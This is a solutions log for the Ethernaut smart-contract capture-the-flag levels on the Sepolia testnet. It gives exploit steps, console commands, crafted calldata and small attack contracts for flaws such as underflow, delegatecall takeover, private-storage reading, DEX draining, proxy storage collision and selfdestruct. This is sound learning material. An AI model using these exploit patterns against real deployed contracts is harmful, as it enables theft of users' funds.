# Ethernaut

- [Problem Set](https://ethernaut.openzeppelin.com/)
- player: [0xB0fD5a878DBF3F9358A251caF9b6Fc692A999cA7](https://sepolia.etherscan.io/address/0xB0fD5a878DBF3F9358A251caF9b6Fc692A999cA7)
- Sepolia Network
- `_ethers.version` == **5.7.2**


## Problem 1: Fallback

contract addr: [0x119fBFcF1b46DcCB3EEae3f40A06bf29f79e3d57](https://sepolia.etherscan.io/address/0x119fBFcF1b46DcCB3EEae3f40A06bf29f79e3d57)

**Solution**

1. Run:
   ```ts
   await contract.contribute({value: _ethers.utils.parseEther("0.0001") })
   ```
   - you are not allowed to contribute 0.001 ether or more to the contract

2. Send 0.0001 tokens to your practice contract from wallet

   - you have became the owner by this point.

3. Run:
   ```ts
   await contract.withdraw()
   ```

4. Submit the contract

Note: beware the max gas limit restricted on Sepolia that metamask won't automatically detect.

## Problem 2: Fallout

contract addr: [0x25d51fC62EfE411ffe273434D1aE20a1a513022d](https://sepolia.etherscan.io/address/0x25d51fC62EfE411ffe273434D1aE20a1a513022d)

**Solution**

1. Run:

   ```ts
   await contract.Fal1out()
   ```

   Everyone can call this function and claim the ownership of the contract

## Problem 3: Coin Flip

- **CoinFlip** contract addr: [0xFb9BcE79EbE63c7551A9EB856b03Eb9E56742dCb](https://sepolia.etherscan.io/address/0xFb9BcE79EbE63c7551A9EB856b03Eb9E56742dCb)
- **SolveCoinFlip** contract addr: [0x8A7BC0BBD97bcDeAf5456E42259e191Fc761A176](https://eth-sepolia.blockscout.com/address/0x8A7BC0BBD97bcDeAf5456E42259e191Fc761A176)
- You can't use typescript js to do this. You need to deploy a contract to attack this contract

## Problem 4: Telephone

- **Telephone** contract addr: [0x92385004C0Af2AE55764d9DD34e747971B4CEb2D](https://sepolia.etherscan.io/address/0x92385004C0Af2AE55764d9DD34e747971B4CEb2D)
- **SolveTelephone** contract addr: [0x399981F8FB9398378a5f9D2E4713dfed803e2a10](https://sepolia.etherscan.io/address/0x399981F8FB9398378a5f9D2E4713dfed803e2a10)

## Problem 5: Token

- contract address: [0xb727dec88DA19d791ac27A287448f86D802648F5](https://sepolia.etherscan.io/address/0xb727dec88DA19d791ac27A287448f86D802648F5)

- player: 0xB0fD5a878DBF3F9358A251caF9b6Fc692A999cA7
- another one: 0x9440Abf16a3319E633DA6835d90470ed029D7c0B

**Solution**

- There is an underflow behavior in the smart contract.
- Just transfer any value larger than 20, it will still pass through the `require(balances[msg.sender] - _value >= 0)` test.

## Problem 6: Delegation

- contract address: [0x344fCaCD370F420d79D5f9f6B74d86Cc1bB05383](https://eth-sepolia.blockscout.com/address/0x344fCaCD370F420d79D5f9f6B74d86Cc1bB05383)

**Solution**

- construct the calldata by:

  ```ts
  const abi = ["function pwn()"];
  const iface = new _ethers.utils.Interface(abi);
  let data = iface.encodeFunctionData("pwn");
  data;
  // display: `0xdd365b8b`
  ```
- send a transaction from metamask wallet to the contract address with the above data.

- note on parity hack:
   https://www.openzeppelin.com/news/on-the-parity-wallet-multisig-hack-405a8c12e8f7

## Problem 7: Force

- Force contract: [0x7Bf28C183F18aFD22857951B21149D8833A1A7c3](https://eth-sepolia.blockscout.com/address/0x7Bf28C183F18aFD22857951B21149D8833A1A7c3)
- ForceTransfer contract: [0x6BA6Af3195dea194aF63C408691ae336A54AdB51](https://eth-sepolia.blockscout.com/address/0x6BA6Af3195dea194aF63C408691ae336A54AdB51)

- Without a `receive() payable` and `fallback() payable`, a contract doesn't take a native token transfer. It will be reverted.
- But you can **selfdestruct** another contract, and that contract will send all remaining ETH to the beneficiary contract.

   ```sol
   // SPDX-License-Identifier: MIT
   pragma solidity ^0.8.0;

   contract ForceSender {
       constructor() payable {}          // fund this contract on deployment
       receive() external payable {}     // or fund later

       function forceSend(address payable target) external {
           selfdestruct(target);         // sends all ETH to target, no fallback/receive called
       }
   }
   ```

- To use metamask as the provider connecting to the blockchain in ethers.js

   ```ts
   // 1) Wrap window.ethereum
   const provider = new _ethers.providers.Web3Provider(window.ethereum);
   ```

## Problem 8: Vault

- Vault addr: [0x50D9a4Aa381dca1B7a0E36523D0A49D668dED769](https://sepolia.etherscan.io/address/0x50D9a4Aa381dca1B7a0E36523D0A49D668dED769)
- How can you view private storage in deployed smart contract?
  **YES you can**, by directly reading the storage slot, using `provider.getStorageAt()`

## Problem 9: King

- King contract: [0x2EF61D5357a8c6d05D9346FE46A49540924aaeD3](https://eth-sepolia.blockscout.com/address/0x2EF61D5357a8c6d05D9346FE46A49540924aaeD3)
- SolveKing contract: [0x37Ec18964BcB3B8702cCCC039268E2F9c9578959](https://eth-sepolia.blockscout.com/address/0x37Ec18964BcB3B8702cCCC039268E2F9c9578959)

**Solution**

- you want to deploy a contract, transfer value, so the smart contract become the king. The smart contract has to revert() inside the `receive()` function so `transfer()` from the caller would fail.

## Problem 10: Re-entrancy

- Reentrance contract: [0x282A05d379B06492bE2ae7717f46949baE4a89b4](https://eth-sepolia.blockscout.com/address/0x282A05d379B06492bE2ae7717f46949baE4a89b4)
- SolveReentrance contract: [0x5e906767e9a29560c11E8797AF5727c1AC9c5472](https://eth-sepolia.blockscout.com/address/0x5e906767e9a29560c11E8797AF5727c1AC9c5472)

## Problem 11: Elevator

- Elevator contract: [0xab4F955b7850317927183490267D732B4f43d053](https://eth-sepolia.blockscout.com/address/0xab4F955b7850317927183490267D732B4f43d053)

- SolveElevator contract: [0xcc57eDeF112544A043a6d868aeccCFd189026150](https://eth-sepolia.blockscout.com/address/0xcc57eDeF112544A043a6d868aeccCFd189026150)

## Problem 12: Privacy

- Privacy contract: [0x6eAF72dfE1F9128693905415F053B2bBEC4cB8BE](https://eth-sepolia.blockscout.com/address/0x6eAF72dfE1F9128693905415F053B2bBEC4cB8BE)

**Solution**

- To read `data[2]` it is at storage slot 5
- storage slot 5 is: `0x675f4672e6c547e6ff949be945aac6022678602fb605a537270c9d15ec6e62f8`
- We want bytes16, the first 16 bytes. So we call unlock() with parameter: `0x675f4672e6c547e6ff949be945aac602`.

## Problem 13: Gatekeeper One

- GatekeeperOne contract: [0x7d9a313e1A8b4741602EFea881Cdd31BFF15E1bd](https://eth-sepolia.blockscout.com/address/0x7d9a313e1A8b4741602EFea881Cdd31BFF15E1bd)

- SolveGatekeeperOne contract: [0x641b1c10D8cd899aAD701426D97Ed96eA893Eac6](https://eth-sepolia.blockscout.com/address/0x641b1c10D8cd899aAD701426D97Ed96eA893Eac6)

**Solution**

- tx.origin: **0xB0fD5a878DBF3F9358A251caF9b6Fc692A999cA7**
- input: **0x00009cA700009cA7**
- txhash: [0x05d94fd106e86d2d85ce495669131459d46781256b21cb4dfc1374571fb8d193](https://eth-sepolia.blockscout.com/tx/0x05d94fd106e86d2d85ce495669131459d46781256b21cb4dfc1374571fb8d193)

## Problem 14: Gatekeeper Two

- GatekeeperTwo contract: [0x805Dfa3BBb4A45b4475643969F5A20a366C130CA](https://eth-sepolia.blockscout.com/address/0x805Dfa3BBb4A45b4475643969F5A20a366C130CA)

- SolveGatekeeperTwo contract: [0xb3E792498C9e05fE4ADdfFd8239064E99c378949](https://eth-sepolia.blockscout.com/address/0xb3E792498C9e05fE4ADdfFd8239064E99c378949)

## Problem 15: Naught Coin

- NaughtCoin contract: [0x0fCca0985F3f8dB96D0A715d261C9222028c2F25](https://eth-sepolia.blockscout.com/address/0x0fCca0985F3f8dB96D0A715d261C9222028c2F25)

**Solution**

- Even though `transfer()` is gated with **lockTokens** check, `transferFrom()` is not.

- So in Chrome dev console, execute the following:

   ```ts
   let tx = await contract.approve(player, '1000000000000000000000000')
   let tx2 = await contract.transferFrom(player, "0xb3E792498C9e05fE4ADdfFd8239064E99c378949", '1000000000000000000000000')
   ```

## Problem 16: Preservation

- Preservation contract: [0x85437951906b0333Be9156bf1c415FA1d55AA90e](https://eth-sepolia.blockscout.com/address/0x85437951906b0333Be9156bf1c415FA1d55AA90e)

- SolvePreservation contract: [0x261AA8EAC6642b3f7B50Da50f42a39b7324931e2](https://eth-sepolia.blockscout.com/address/0x261AA8EAC6642b3f7B50Da50f42a39b7324931e2)

**Solution**

- Run in dev console

   ```ts
   let addrNum = _ethers.BigNumber.from("0x261AA8EAC6642b3f7B50Da50f42a39b7324931e2")
   addrNum.toString()
   // display: 217536183420285343367994901537296371963644162530

   // Afterward, run (yes, twice)
   await contract.setFirstTime("217536183420285343367994901537296371963644162530")
   await contract.setFirstTime("217536183420285343367994901537296371963644162530")
   ```

- Refer to txHash: [0xbf0291794ccfd65b519f2081c1ef0ee969e2d699d2d9bf41a57dcb871fba3dbd](https://sepolia.etherscan.io/tx/0xbf0291794ccfd65b519f2081c1ef0ee969e2d699d2d9bf41a57dcb871fba3dbd)

In etherscan, when viewing a txHash, looking over **State**, you can see which storage slot a tx has updated.

## Problem 17: Recovery

- Recovery contract: [0x499BBe67c781e73762EcecC7Cbb082043639a053](https://eth-sepolia.blockscout.com/address/0x499BBe67c781e73762EcecC7Cbb082043639a053)

**Solution**

- Reviewing the contract [internal txns](https://eth-sepolia.blockscout.com/address/0x499BBe67c781e73762EcecC7Cbb082043639a053?tab=internal_txns), it has created the SimpleToken contract at [0xfee6656D854B4a27777F98e68bbBA12C66F70B14](https://eth-sepolia.blockscout.com/address/0xfee6656D854B4a27777F98e68bbBA12C66F70B14).

- Copy the **SimpleToken** code in etherscan
- Load up the contract at the above address: **0xfee6656D854B4a27777F98e68bbBA12C66F70B14**.
- Call **destroy()**

## Problem 18: Magic Number

- MagicNum contract: [0x0465E8AaF6E1fbcC756E7dbAD8eD8E1509409068](https://eth-sepolia.blockscout.com/address/0x0465E8AaF6E1fbcC756E7dbAD8eD8E1509409068)

- Deployed contract: [0xfcFa5d641285952B4f71564c5BC4952b370B7594](https://eth-sepolia.blockscout.com/address/0xfcFa5d641285952B4f71564c5BC4952b370B7594)

Ref:
- AI ans: https://www.perplexity.ai/search/the-ethernaut-G1EIbK15TA.3qnWN4q53sA#29
- How to deploy raw bytecode to the EVM: https://ardislu.dev/raw-bytecode-evm

**Solution**

- Learn about what the byte code means

- Runtime code:
  ```
  60 2A  - push 42
  60 00  - push 0
  52     - MSTORE
  60 20  - push 32
  60 00  - push 0
  F3     - RETURN
  ```

  So the full deployed bytecode: 602A60005260206000F3

- Creation code:
  ```
  600a600c600039600a6000f3
  ```

- Full bytecode with creation code:
  ```
  600a600c600039600a6000f3602A60005260206000F3
  ```

- Deploy the bytes code on Sepolia

  ```ts
  let provider = _ethers.providers.Web3Provider(window.ethereum);
  const signer = provider.getSigner();
  let tx = await signer.sendTransaction({ data: "0x600a600c600039600a6000f3602A60005260206000F3" });

  // Find the deployed contract address from the returned txHash
  await contract.setSolver("0xfcFa5d641285952B4f71564c5BC4952b370B7594");
  ```

## Problem 19: Alien Codex

- AlienCodex contract: [0x3F223FD13b35731eD43D8C38548aBdd2e0B3eCae](https://eth-sepolia.blockscout.com/address/0x3F223FD13b35731eD43D8C38548aBdd2e0B3eCae)

**Solution**

- The insight is the storage layout is
   ```sol
   address private owner   // 20-byte storage slot 0
   bool public contact     // 1-byte storage slot 0
   bytes32[] public codex  // its len is 32-byte storage slot 1
   ```

   The content of the first element of codex is stored at `keccak256("0x0000000000000000000000000000000000000000000000000000000000000001")`, which is **0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6**.

- Call retract(), so its codex length underflow and become 0xffff.., allow accessing all storage.
   ```ts
   await contract.retract()
   ```

- We calculate from the content location `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`, if we access codex **35707666377435648211887908874984608119992236509074197713628505308453184860938**th element (by `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff` - `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6` + 1), we are writing back to storage slot 0x0000000000000000000000000000000000000000000000000000000000000000.
   ```ts
   await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', "0x000000000000000000000000B0fD5a878DBF3F9358A251caF9b6Fc692A999cA7");
   ```

## Problem 20: Denial

- Denial contract: [0x47b6719d71f7B6Bf6D9234Ca8f3C31bFa328357A](https://eth-sepolia.blockscout.com/address/0x47b6719d71f7B6Bf6D9234Ca8f3C31bFa328357A)

- SolveDenial contract: [0x73E201be2A7e6695Ee81958E8172bd559c52Dc98](https://eth-sepolia.blockscout.com/address/0x73E201be2A7e6695Ee81958E8172bd559c52Dc98)

**Learning**

The attack is called gas grieving - depleting all the transaction gas.

If you are using a low level `call` to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example `<Address>.call{gas: <gasAmount>}(data)`. Typically one should follow the [checks-effects-interactions](https://docs.soliditylang.org/en/v0.8.33/security-considerations.html#reentrancy) pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

## Problem 21: Shop

- Shop contract: [0x4f6cF5291B7da082657b6237AAf16d177AEfabd7](https://eth-sepolia.blockscout.com/address/0x4f6cF5291B7da082657b6237AAf16d177AEfabd7)

- SolveShop contract: [0x628Bda7Ea5632E928CE364b91FE60927D697646f](https://sepolia.etherscan.io/address/0x628Bda7Ea5632E928CE364b91FE60927D697646f)

**Learning**

The learning is that even though the called contract is restricted to be a view function. It can still read other contracts and rely on external contract states, and make it behave like a function that depend on varying states.

## Problem 22: Dex

- Dex contract: [0x2fc8d823E95Ad23514373175Bfbf16a9d20Acc72](https://eth-sepolia.blockscout.com/address/0x2fc8d823E95Ad23514373175Bfbf16a9d20Acc72)

**Solution**

- If you keep swapping one token all the way to another token, you will incrementally making additional profit because of the division in **getSwapPrice()** that it performs.
- Keep swapping from one token to the other, back and forth, until you drain the DEX. On the last swap, you have to compute the exact amount so you don't retrieve more tokens than what the DEX has.

## Problem 23: Dex Two

- DexTwo contract: [0xd8CF74d217A2b6744Eec1aEB8234B8Dca76B3c4c](https://eth-sepolia.blockscout.com/address/0xd8CF74d217A2b6744Eec1aEB8234B8Dca76B3c4c)

- MyToken contract: [0x5AdB7917691d375B7a1ea1E8C12B4AC38Ca75c69](https://eth-sepolia.blockscout.com/address/0x5AdB7917691d375B7a1ea1E8C12B4AC38Ca75c69)

**Solution**

- Deploy the MyToken contract and mint yourself **4** MyTokens.
- Transfer **1** MyToken from your own account to the DEX.
- Swap your own **1** MyToken to `token1` with the DEX (100% of MyToken).
- Swap your own **2** MyToken to `token2` with the DEX (100% of MyToken).
- By this point, all `token1` and `token2` have been depleted from the DEX. Submit the solution.

## Problem 24: Puzzle Wallet

- PuzzleProxy contract: [0x7a162793a1EBE2C04A288994d8F8457719cd7Fcc](https://eth-sepolia.blockscout.com/address/0x7a162793a1EBE2C04A288994d8F8457719cd7Fcc)

**Solution**

- Build up the proxy interface for the contract

  ```ts
  let proxyAbi = [
    "function pendingAdmin() view returns (address)",
    "function admin() view returns (address)",
    "function proposeNewAdmin(address)",
    "function approveNewAdmin(address)",
    "function upgradeTo(address)",
  ];

  let proxyContract = new _ethers.Contract(contract.address, proxyAbi, provider);
  ```

- Propose the new admin via the PuzzleProxy function selector
  ```ts
  await proxyContract.proposeNewAdmin(player)
  ```

- Whitelist the player himself
  ```ts
  await contract.whitelisted(player)
  ```

- Then we want to construct a multicall like this:
  ```
  contract.multicall([
    multicall([deposit()]),
    multicall([deposit()]),
    multicall([deposit()]),
  ], { value: 0.005 })
  ```

  With this, we will only deposit **0.005** `msg.value`, but being recorded as **0.015**, that is `balance[player] == 0.015 ether`.

  Execute the following:

  ```ts
  let iface = new _ethers.utils.Interface(proxyAbi);
  let depositSel = iface.encodeFunctionData("deposit");
  // depositSel becomes '0xd0e30db0'

  let multiCallSel = iface.encodeFunctionData("multicall", [[depositSel]]);
  // multiCallSel becomes '0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000'

  await contract.multicall([multiCallSel, multiCallSel, multiCallSel], {value: toWei("0.005")});
  ```

- Now we can withdraw all the balance of the contract and call setMaxBalance()
  ```ts
  // withdraw the money
  await contract.execute(player, toWei("0.006"), "0x")

  // call setMaxBalance()
  let playerBN = _ethers.BigNumber.from(player);
  await contract.setMaxBalance(playerBN);
  ```

## Problem 25: Motorbike

- Motorbike contract: [0xe466f99614C4641b858675DAd573dC84BE565D9a](https://eth-sepolia.blockscout.com/address/0xe466f99614C4641b858675DAd573dC84BE565D9a)

- Engine contract: [0xffe5af570904094b7fbcd10a8221a1d46abef4ff](https://sepolia.etherscan.io/address/0xffe5af570904094b7fbcd10a8221a1d46abef4ff)

- DestroyMotorbikeEngine: [0x4D6e5e7231bE1a81C6B5d3C0504AAC199a6b1E86](https://eth-sepolia.blockscout.com/address/0x4D6e5e7231bE1a81C6B5d3C0504AAC199a6b1E86)

```ts
let provider = new _ethers.providers.Web3Provider(window.ethereum);
let signer = provider.getSigner();

let engineABI = [
  "function upgrader() view returns (address)",
  "function horsePower() view returns (uint256)",
  "function initialize()",
  "function upgradeToAndCall(address, bytes)",
]

let engineAddr = "0xffe5af570904094b7fbcd10a8221a1d46abef4ff"
let engineContract = new _ethers.Contract(engineAddr, engineABI, signer);

let destroyABI = [
  "function destroyContract()",
]

let destroyContract = new _ethers.Contract(engineAddr, destroyABI, signer);
```

**Solution**

- Note the Engine is not initialized yet.
- Call `initialize()` and claim the upgrader.
- Then deploy a simple smart contract that call `selfdestruct(msg.sender)`.
- Call that function.

But this solution no longer work after Dencun EVM upgrade (on Mar 2024).

## Problem 26: DoubleEntryPoint

- [CreateInstance tx](https://sepolia.etherscan.io/tx/0xe5e57b7dd9994d348806e7cd5462adf348b2d0575b1244415c2377785ce01724)

- DET Token contract: [0xeae3ed3dE56A6BbC3694AD89c832590489D71F58](https://eth-sepolia.blockscout.com/address/0xeae3ed3dE56A6BbC3694AD89c832590489D71F58)
- LegacyToken LGT contract: [0xAE680c15033693a617732293F948e492dd93F0Ea](https://sepolia.etherscan.io/address/0xae680c15033693a617732293f948e492dd93f0ea)
- Forta contract: [0xf970B49C00CeBf6892bD9321A680c344fFC26133](https://sepolia.etherscan.io/address/0xf970b49c00cebf6892bd9321a680c344ffc26133)
- CryptoVault contract: [0xf57BC5eF61DE236C7404d99D3f1D13AA5F157B48](https://sepolia.etherscan.io/address/0xf57bc5ef61de236c7404d99d3f1d13aa5f157b48)

```ts
let cryptoVaultAddr = "0xf57BC5eF61DE236C7404d99D3f1D13AA5F157B48"
let cryptoVaultABI = [
  "function sweptTokensRecipient() view returns(address)",
  "function underlying() view returns(address)",
]
let cryptoVault = new _ethers.Contract(cryptoVaultAddr, cryptoVaultABI, signer)

let legacyTokenAddr = "0xAE680c15033693a617732293F948e492dd93F0Ea"
let legacyTokenABI = [
  "function delegate() view returns(address)",
  "function transfer(address, uint256) returns (bool)"
]
let legacyToken = new _ethers.Contract(legacyTokenAddr, legacyTokenABI, signer)

```

**Solution**

- DetectionBot: [0x63574f0A5340138c54c1f42B085207b86B3176de](https://sepolia.etherscan.io/address/0x63574f0A5340138c54c1f42B085207b86B3176de)

- Set the detection bot
  ```ts
  let fortaAddr = "0xf970B49C00CeBf6892bD9321A680c344fFC26133"
  let fortaABI = [
    "function setDetectionBot(address)",
    "function notify(address, bytes)",
    "function raiseAlert(address)"
  ];
  let forta = new _ethers.Contract(fortaAddr, fortaABI, signer)

  await forta.setDetectionBot("0x63574f0A5340138c54c1f42B085207b86B3176de")
  ```

## Problem 27: Good Samaritan

- creation tx: [0xa4ba786eab894b8aeb37a45dc6709813195214c95330462af72212dd10cf6644](https://sepolia.etherscan.io/tx/0xa4ba786eab894b8aeb37a45dc6709813195214c95330462af72212dd10cf6644)
- Good Samaritan contract: [0xCbfd95775883BFC850Ba5De9f3116e1C6b27117A](https://sepolia.etherscan.io/address/0xCbfd95775883BFC850Ba5De9f3116e1C6b27117A)
- wallet contract: [0x3b1a1bbF8F20b66B315590652A3FE5CF9E29B1a0](https://sepolia.etherscan.io/address/0x3b1a1bbF8F20b66B315590652A3FE5CF9E29B1a0)
- coin contract: [0xf69b02d618e988b8b0536000e8d8b815b38b5e1d](https://sepolia.etherscan.io/address/0xf69b02d618e988b8b0536000e8d8b815b38b5e1d)

```ts
let provider = new _ethers.providers.Web3Provider(window.ethereum);
let signer = provider.getSigner();

let goodSamAddr = "0xCbfd95775883BFC850Ba5De9f3116e1C6b27117A"
let goodSam = contract;

let coinAddr = "0xf69b02d618e988b8b0536000e8d8b815b38b5e1d"
let coinABI = [
  "function balances(address) view returns(uint256)",
  "function transfer(address, uint256)",
]
let coin = new _ethers.Contract(coinAddr, coinABI, signer)

let walletAddr = "0x3b1a1bbF8F20b66B315590652A3FE5CF9E29B1a0"
let walletABI = [
  "function owner() view returns (address)",
  "function coin() view returns (address)",
  "function donate10(address)",
  "function transferRemainder(address)",
  "function setCoin(address)"
]
let wallet = new _ethers.Contract(walletAddr, walletABI, signer)

```

- SolveGoodSamaritan contract: [0x2681eC9DDAa6F43568e96fa1D82B4268aeEAE4DA](https://eth-sepolia.blockscout.com/address/0x2681eC9DDAa6F43568e96fa1D82B4268aeEAE4DA)

## Problem 28: Gatekeeper Three

- creation tx: [0x0f4a3a2157e0c260749b293cd55cb6299d866d8d5bb5faf0443ed42995f8f91f](https://sepolia.etherscan.io/tx/0x0f4a3a2157e0c260749b293cd55cb6299d866d8d5bb5faf0443ed42995f8f91f)
- GatekeeperThree contract: [0xd013Eda19a0CC798AF65C9cF4faA0D90BfA02A6C](https://sepolia.etherscan.io/address/0xd013eda19a0cc798af65c9cf4faa0d90bfa02a6c)
- SimpleTrick contract: [0x497dC385C99C4893d7EF80eB463f58b852FF6EAa](https://sepolia.etherscan.io/address/0x497dc385c99c4893d7ef80eb463f58b852ff6eaa)

**Solution**

1. Deploy `SolveGatekeeperThree()` with **msg.value** `1010000000000000` and GatekeeperThree address

   SolveGatekeeperThree contract: [0xDd37ba9D4f08Ea8aBd9C5122Db6AdB46A709B61C](https://sepolia.etherscan.io/address/0xDd37ba9D4f08Ea8aBd9C5122Db6AdB46A709B61C)

2. Query the storage slot of the trick contract
   ```ts
   let trickAddr = "0x497dC385C99C4893d7EF80eB463f58b852FF6EAa"
   await provider.getStorageAt(trickAddr, 2)
   // the value is 6985c68c, which is 1770374796 in decimal
   ```

3. Call `SolveGatekeeperThree.solve(1770374796)`

   Tx: [0x8b72583099d2ecf44782aa3e1e94f73a99b57337b28281de8234d92cae668d3b](https://sepolia.etherscan.io/tx/0x8b72583099d2ecf44782aa3e1e94f73a99b57337b28281de8234d92cae668d3b)

## Problem 29: Switch

- creation tx: [0x275747ac86601eddc9aeb18b82e149b274968e3b3e1cccdafcad7f0913fef054](https://sepolia.etherscan.io/tx/0x275747ac86601eddc9aeb18b82e149b274968e3b3e1cccdafcad7f0913fef054)
- Switch contract: [0x5b2ed6de4b16075de7c4a826e9ff6160fcb689f3](https://sepolia.etherscan.io/address/0x5b2ed6de4b16075de7c4a826e9ff6160fcb689f3)

- The key is to send a low-level call, with the following hex data:
  `0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000`

## Problem 30: HigherOrder

- creation tx: [0x66797a4a76ca2c5a7967830163d4dbca09383c6fe446765e9b89629e0855e584](https://sepolia.etherscan.io/tx/0x66797a4a76ca2c5a7967830163d4dbca09383c6fe446765e9b89629e0855e584)
- HigherOrder contract: [0x73Aaa9313BcbE60C2B65EEF58Ab195231BaEc1Fa](https://sepolia.etherscan.io/address/0x73Aaa9313BcbE60C2B65EEF58Ab195231BaEc1Fa)

**Solution**
- The key is even though function `registerTreasury(uint8)` takes **uint8** as a parameter. In `solc` v0.6.12, parameter calldata is encoded as bytes32 and does not perform any boundary check, so one can construct a calldata that is above 255 in the parameter.

  In **HigherOrder.t.sol**, such a calldata is constructed at:

  ```sol
  bytes memory callData = abi.encodeWithSelector(HigherOrder.registerTreasury.selector, bytes32(uint256(256)));

  // The value is: `0x211c85ab0000000000000000000000000000000000000000000000000000000000000100`
  ```

- Execute the following:

  ```ts
  let provider = new _ethers.providers.Web3Provider(window.ethereum);
  let signer = provider.getSigner();

  await signer.sendTransaction({
    to: contract.address,
    data: "0x211c85ab0000000000000000000000000000000000000000000000000000000000000100",
  });

  await contract.claimLeadership()
  ```

- registerTreasury tx: [0x18976b2a0ebc2b687955d30b17ebf1e24899d9b1050742883a6603032867dfbc](https://sepolia.etherscan.io/tx/0x18976b2a0ebc2b687955d30b17ebf1e24899d9b1050742883a6603032867dfbc)
- claimLeadership tx: [0x10f7e802c3cbf425191d46fb967a493caf19d6c2145a33c82439fe1fc613413f](https://sepolia.etherscan.io/tx/0x10f7e802c3cbf425191d46fb967a493caf19d6c2145a33c82439fe1fc613413f)
